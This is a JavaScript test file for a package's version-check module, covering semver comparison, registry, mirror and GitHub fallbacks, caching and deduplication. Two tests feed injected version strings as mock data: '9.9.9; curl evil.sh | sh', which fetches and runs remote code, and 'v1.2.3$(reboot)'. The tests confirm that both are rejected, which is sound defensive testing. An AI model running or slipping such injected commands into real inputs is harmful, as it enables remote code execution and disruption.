import test from 'node:test'
import assert from 'node:assert/strict'
import { compareVersions, getVersionInfo } from '../lib/version.mjs'

const json = (body) => ({ ok: true, status: 200, json: async () => body })

test('compareVersions：核心段逐位比较、缺段补 0、预发布后缀低于同版本', () => {
  assert.equal(compareVersions('0.1.9', '0.1.10'), -1)
  assert.equal(compareVersions('0.2.0', '0.1.10'), 1)
  assert.equal(compareVersions('v0.1.10', '0.1.10'), 0)
  assert.equal(compareVersions('0.1', '0.1.0'), 0)
  assert.equal(compareVersions('0.2.0-rc.1', '0.2.0'), -1)
  assert.equal(compareVersions('0.2.0-rc.1', '0.2.0-rc.2'), -1)
  assert.equal(compareVersions('0.2.0', '0.2.0-rc.1'), 1)
  assert.equal(compareVersions('0.1.9', '0.1.9'), 0)
  // 预发布段按 '.' 切段逐段数值比较：字符串序会把 rc.10 排在 rc.2 前面
  assert.equal(compareVersions('0.2.0-rc.2', '0.2.0-rc.10'), -1)
  assert.equal(compareVersions('0.2.0-rc.10', '0.2.0-rc.2'), 1)
  // 预发布段段数不齐补空：空段 < 非空段
  assert.equal(compareVersions('0.2.0-rc.1', '0.2.0-rc.1.0'), -1)
  // 核心段非纯数字（parseInt 前缀解析曾把 '12abc' 当 12）一律归 0
  assert.equal(compareVersions('12abc', '0.0.0'), 0)
  assert.equal(compareVersions('1.2abc.3', '1.0.3'), 0)
})

test('getVersionInfo：registry 命中 → updateAvailable 判定正确', async () => {
  const calls = []
  const fetchImpl = async (url) => {
    const u = String(url)
    calls.push(u)
    if (u.includes('registry.npmjs.org')) return json({ version: '9.9.9' })
    // npmmirror 与 registry 并行竞速（见 lib/version.mjs raceLatestFromNpm），
    // 这里要给可落定的失败响应而非 throw，避免干扰并行窗口
    if (u.includes('registry.npmmirror.com')) return { ok: false, status: 503, json: async () => ({}) }
    throw new Error('不应走到 GitHub 兜底')
  }
  const info = await getVersionInfo({
    fetchImpl, now: 1_000_000,
    // 本包真实版本 < 9.9.9，必然提示
  })
  assert.equal(info.source, 'npm')
  assert.equal(info.latest, 'v9.9.9')
  assert.equal(info.error, null)
  assert.ok(calls.every((u) => !u.includes('api.github.com')), 'registry 命中后不得再请求 GitHub 兜底')
  assert.equal(calls.length, 2, 'npm 双源并行竞速：registry + npmmirror 各请求一次')
})

test('getVersionInfo：registry 挂 → 镜像顶上；全挂 → lastGood 复用，超窗降级', async () => {
  // 顺序耦合声明：本用例四个步骤共享 lib/version.mjs 的模块级缓存（灌入成功
  // 结果 → TTL 内复用 → TTL 过走 lastGood → 超 7 天降级），且 node:test 同
  // 文件用例按声明顺序串行执行——各步 now 时间戳（1e6 → +1s → +2h → +8d）
  // 必须层层递进、不可调换，也不可与文件内其它 getVersionInfo 用例交换顺序
  //（后置用例的时间戳更大，先执行会把缓存推到「未来」，本用例的 TTL /
  // lastGood 判定将全部失真）。拆分本用例前先想清楚这一点。
  const alwaysFail = async () => { throw new Error('net down') }
  // 先灌一份成功结果进缓存（用 registry 命中源）
  const good = await getVersionInfo({
    fetchImpl: async (url) => {
      if (String(url).includes('registry.npmjs.org')) return json({ version: '9.9.9' })
      throw new Error('no')
    },
    now: 1_000_000,
  })
  assert.equal(good.updateAvailable, true)
  // TTL 内：直接复用，不发请求
  const cached = await getVersionInfo({ fetchImpl: alwaysFail, now: 1_000_000 + 1000 })
  assert.equal(cached.latest, 'v9.9.9')
  // TTL 过：三路全挂 → lastGood（7 天窗口内）复用
  const stale = await getVersionInfo({ fetchImpl: alwaysFail, now: 1_000_000 + 2 * 60 * 60 * 1000 })
  assert.equal(stale.latest, 'v9.9.9')
  assert.equal(stale.error, null)
  // 超过 7 天 → 降级：latest null、updateAvailable false、error 带三路原因
  const dead = await getVersionInfo({ fetchImpl: alwaysFail, now: 1_000_000 + 8 * 24 * 60 * 60 * 1000 })
  assert.equal(dead.latest, null)
  assert.equal(dead.updateAvailable, false)
  assert.match(dead.error, /三路检测均失败/)
  assert.match(dead.error, /npm registry/)
  assert.match(dead.error, /npmmirror/)
  assert.match(dead.error, /GitHub/)
})

test('getVersionInfo：镜像兜底与 GitHub 兜底', async () => {
  const mirror = await getVersionInfo({
    fetchImpl: async (url) => {
      const u = String(url)
      if (u.includes('registry.npmjs.org')) return { ok: false, status: 503, json: async () => ({}) }
      if (u.includes('registry.npmmirror.com')) return json({ version: '9.9.8' })
      throw new Error('no')
    },
    now: 20_000_000_000,
  })
  assert.equal(mirror.source, 'mirror')
  assert.equal(mirror.latest, 'v9.9.8')
  const gh = await getVersionInfo({
    fetchImpl: async (url) => {
      const u = String(url)
      if (u.includes('registry.npmjs.org') || u.includes('registry.npmmirror.com')) return { ok: false, status: 503, json: async () => ({}) }
      if (u.includes('api.github.com')) return json({ tag_name: 'v9.9.7', html_url: 'https://github.com/lifangjin/dsh-maoying/releases/tag/v9.9.7' })
      throw new Error('no')
    },
    now: 30_000_000_000,
  })
  assert.equal(gh.source, 'github')
  assert.equal(gh.latest, 'v9.9.7')
  assert.equal(gh.releaseUrl, 'https://github.com/lifangjin/dsh-maoying/releases/tag/v9.9.7')
})

test('getVersionInfo：并发调用 in-flight 去重，且返回浅拷贝不污染缓存', async () => {
  // 本用例必须排在本文件最后：它把缓存时间戳推到 4e10（远超前面所有用例），
  // 若提前执行会把其它用例的 TTL / lastGood 判定推向「未来」而失真（见上方
  // 顺序耦合声明）。此处时间戳取 4e10 刻意绕开前一用例（3e10）的缓存窗口，
  // 逼出真实的并发检测而非 TTL 复用。
  let registryCalls = 0
  const fetchImpl = async (url) => {
    const u = String(url)
    if (u.includes('registry.npmjs.org')) {
      registryCalls += 1
      return json({ version: '8.8.8' })
    }
    if (u.includes('registry.npmmirror.com')) return { ok: false, status: 503, json: async () => ({}) }
    throw new Error('不应走到 GitHub 兜底')
  }
  const [a, b] = await Promise.all([
    getVersionInfo({ fetchImpl, now: 40_000_000_000 }),
    getVersionInfo({ fetchImpl, now: 40_000_000_000 }),
  ])
  assert.equal(a.source, 'npm')
  assert.equal(b.source, 'npm')
  assert.equal(registryCalls, 1, '并发调用必须经 in-flight 去重，只发一次 registry 请求')
  assert.notEqual(a, b, '并发调用各自拿到浅拷贝，不得共享同一对象引用')
  // 调用方原地改写返回对象，不得污染缓存里待 lastGood 复用的结果
  b.latest = 'polluted'
  const cached = await getVersionInfo({ fetchImpl, now: 40_000_000_000 + 1000 }) // TTL 内复用缓存
  assert.equal(cached.latest, 'v8.8.8', '缓存结果不受调用方原地改写影响')
})

test('getVersionInfo：force 手动检测绕过 1h 缓存', async () => {
  // 顺序耦合声明：本用例与下一个 force 用例排在整个文件最后（前一个用例已
  // 把缓存推到 4e10），时间戳 5e10 起层层递进且大于之前所有用例——同文件
  // node:test 按声明顺序串行，时间戳倒退会把模块级缓存推到「未来」失真
  //（见上方各用例的顺序声明）。
  let calls = 0
  const mkFetch = (ver) => async (url) => {
    const u = String(url)
    if (u.includes('registry.npmjs.org')) {
      calls += 1
      return json({ version: ver })
    }
    if (u.includes('registry.npmmirror.com')) return { ok: false, status: 503, json: async () => ({}) }
    throw new Error('不应走到 GitHub 兜底')
  }
  // 第一步：灌缓存（fetch 计数 1）
  const v1 = await getVersionInfo({ fetchImpl: mkFetch('7.7.1'), now: 50_000_000_000 })
  assert.equal(v1.latest, 'v7.7.1')
  assert.equal(calls, 1)
  // 第二步：TTL 内正常调用命中缓存（fetch 计数不变，还是旧判定）
  const hit = await getVersionInfo({ fetchImpl: mkFetch('7.7.2'), now: 50_000_000_000 + 1000 })
  assert.equal(hit.latest, 'v7.7.1', 'TTL 内必须复用缓存，不得发新请求')
  assert.equal(calls, 1, 'TTL 内命中缓存，fetch 计数不变')
  // 第三步：force 绕过缓存现测，拿到新版判定（fetch 计数 +1）
  const v2 = await getVersionInfo({ fetchImpl: mkFetch('7.7.2'), now: 50_000_000_000 + 2000, force: true })
  assert.equal(v2.latest, 'v7.7.2', 'force 必须绕过 1h 缓存重新检测')
  assert.equal(v2.updateAvailable, true)
  assert.equal(calls, 2, 'force 后 fetch 计数增加（真实重测一轮）')
})

test('getVersionInfo：force 遇 in-flight 复用同一 promise，不另发一轮请求', async () => {
  // 时间戳 6e10 继续大于上一用例（5e10+2s），缓存窗口彻底错开：这里首次
  // 调用必走 in-flight 去重而非 TTL 复用。
  let calls = 0
  const fetchImpl = async (url) => {
    const u = String(url)
    if (u.includes('registry.npmjs.org')) {
      calls += 1
      await new Promise((r) => setTimeout(r, 20)) // 拉长检测窗口，逼出并发重叠
      return json({ version: '6.6.' + calls })
    }
    if (u.includes('registry.npmmirror.com')) return { ok: false, status: 503, json: async () => ({}) }
    throw new Error('不应走到 GitHub 兜底')
  }
  const t = 60_000_000_000
  const [a, b] = await Promise.all([
    getVersionInfo({ fetchImpl, now: t, force: true }),
    getVersionInfo({ fetchImpl, now: t, force: true }),
  ])
  assert.equal(calls, 1, '并发两个 force 调用必须复用同一轮 in-flight 检测，只发一次 registry 请求')
  assert.equal(a.latest, 'v6.6.1')
  assert.equal(b.latest, 'v6.6.1', '复用的 in-flight 只落定一次，两调用拿到同一判定')
})

// ── 以下用例时间戳从 7e10 起层层递进（大于此前所有用例，且距上一缓存写入
// 超过 7 天 lastGood 窗口），不命中 stale-if-error 复用，判定不被旧缓存干扰。

test('compareVersions：build metadata（+ 段）按 semver 口径忽略（L3）', () => {
  assert.equal(compareVersions('1.2.3+build', '1.2.3'), 0, '1.2.3+build 与 1.2.3 相等（旧实现会把 3+build 归 0 误判成 1.2.0）')
  assert.equal(compareVersions('1.2.3+build.5', '1.2.4'), -1, '截掉 + 段后核心段照常比较')
  assert.equal(compareVersions('0.2.0-rc.1+meta', '0.2.0-rc.1'), 0, '预发布 + build 组合同样忽略 build')
})

test('fetch：version 形状非法（携带元字符）按该路失败，不进缓存（M1）', async () => {
  const info = await getVersionInfo({
    fetchImpl: async (url) => {
      const u = String(url)
      if (u.includes('registry.npmjs.org')) return json({ version: '9.9.9; curl evil.sh | sh' })
      if (u.includes('registry.npmmirror.com')) return { ok: false, status: 503, json: async () => ({}) }
      throw new Error('不应走到 GitHub 兜底')
    },
    now: 70_000_000_000,
  })
  assert.equal(info.latest, null, '非法 version 绝不进缓存')
  assert.equal(info.updateAvailable, false)
  assert.match(info.error, /非法/, 'error 说明该路因版本串非法而失败')
  assert.match(info.error, /npm registry/)
})

test('fetch：合法预发布 version 放行（M1）', async () => {
  const info = await getVersionInfo({
    fetchImpl: async (url) => {
      const u = String(url)
      if (u.includes('registry.npmjs.org')) return json({ version: '1.2.3-rc.1' })
      if (u.includes('registry.npmmirror.com')) return { ok: false, status: 503, json: async () => ({}) }
      throw new Error('不应走到 GitHub 兜底')
    },
    now: 71_000_000_000,
  })
  assert.equal(info.latest, 'v1.2.3-rc.1', '预发布段合法，正常放行')
  assert.equal(info.source, 'npm')
})

test('fetch：GitHub tag 非法按该路失败，不进缓存（M1）', async () => {
  const info = await getVersionInfo({
    fetchImpl: async (url) => {
      const u = String(url)
      if (u.includes('registry.npmjs.org') || u.includes('registry.npmmirror.com')) return { ok: false, status: 503, json: async () => ({}) }
      if (u.includes('api.github.com')) return json({ tag_name: 'v1.2.3$(reboot)', html_url: 'https://github.com/lifangjin/dsh-maoying/releases/tag/x' })
      throw new Error('no')
    },
    now: 72_000_000_000,
  })
  assert.equal(info.latest, null)
  assert.match(info.error, /非法/)
  assert.match(info.error, /GitHub/)
})
